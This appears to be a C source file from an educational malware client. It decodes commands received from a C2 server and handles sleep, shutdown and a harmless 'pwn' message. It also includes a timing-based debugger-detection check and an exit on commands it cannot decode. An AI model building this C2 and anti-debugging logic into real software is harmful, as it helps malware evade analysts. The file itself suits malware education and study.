 
#include <string.h>

#include "commands.h"
#include "client.h"
#include "../program/program.h"

// private method prototypes
static RET_CODE executeCommand(char* cmdStr, unsigned char key, int* slp);
static void doSleep(int n);
static void doPawn();
static int extractN(char* cmdStr);


/**
 * split the cmds based upon newline characters. Then execute each one sequentially.
 * NOTE: if we detect the commands were incorectly encoded its likely due to the C2
 * being spoofed, as such do not execute them! Furthermore, if we detect that a 
 * given command takes longer than 2.5s to execute then we are likely being debugged
 * so exit!
 */
RET_CODE processCommands(CLIENT_HANDLER* client) {
    char* saveState;
    char* line = strtok_r(client->cmdBuffer, "\n", &saveState);

    LARGE_INTEGER start, end, freq;
    while (line != NULL) {
        QueryPerformanceFrequency(&freq);
        QueryPerformanceCounter(&start);

        int slp = 0;
        RET_CODE ret = executeCommand(line, ctx->__KEY__, &slp);

        QueryPerformanceCounter(&end);
        LONG elapsedTime = ((end.QuadPart - start.QuadPart) / freq.QuadPart) - slp;

        if (elapsedTime > 2.5) {   // if it longer than 2.5 seconds then exit
            printf("Debugger detected by performance!\n");
            return R_DETECT;
        }

        // if shutdown, or the commands were incorrectly encoded then exit!
        if (ret == R_DO_SHUTDOWN)   { return R_DO_SHUTDOWN; }
        if (ret == R_INCORRECT_ENC) { return R_INCORRECT_ENC; }

        line = strtok_r(NULL, "\n", &saveState);
    }
    return R_SUCCESS;
}

/**
 * Takes a single command, matching the given action and generating a new 
 * COMMAND struct. Then dispatches command execute before freeing the memory again
 */
static RET_CODE executeCommand(char* cmdStr, unsigned char key, int* slp) {
    encode(cmdStr, &key);
    
    if (strncmp(cmdStr, "slp", 3) == 0) {
        ctx->sleeping = TRUE;

        // we want to record how long we've slept incase we are being debugged!
        *slp = extractN(cmdStr + 3);
        doSleep(*slp * 1000); // pass the milliseconds we want to sleep for

        ctx->sleeping = FALSE;
        return R_SUCCESS;
    } 
    if (strncmp(cmdStr, "shd", 3) == 0) {
        ctx->shutdown = TRUE;
        return R_DO_SHUTDOWN;
    } 
    if (strncmp(cmdStr, "pwn", 3) == 0) {
        doPawn();
        return R_SUCCESS;
    }
    
    return R_INCORRECT_ENC; 
}

/**
 * simply sleep for n seconds, this halts all threads because the mutex was aquired
 * before the remote commands could be executed!
 */
static void doSleep(int n) {
    printf("Sleeping for %dms\n", n);
    Sleep(n);
    printf("Sleep finsished!\n");
}

/**
 * print out a you've been pwned message
 */
static void doPawn() {
    printf("\nUnfortunately you been pwn'ed hehehe (educationally speaking :))!\n");
    printf("You may potentially want to change you password...\n\n");
}

/**
 * This method will only only return a +ve int when the slp command is given, otherwise it returns 0. 
 * It will simple skip an whitespaces and then return the number if it exists
 */
static int extractN(char* cmdStr) {
    while (*cmdStr != '\0' && !isdigit(*cmdStr)) { cmdStr++; }  // skip non-digit chars

    if (isdigit(*cmdStr)) { // return the number if it exists
        return atoi(cmdStr);
    }
    return 0;
}
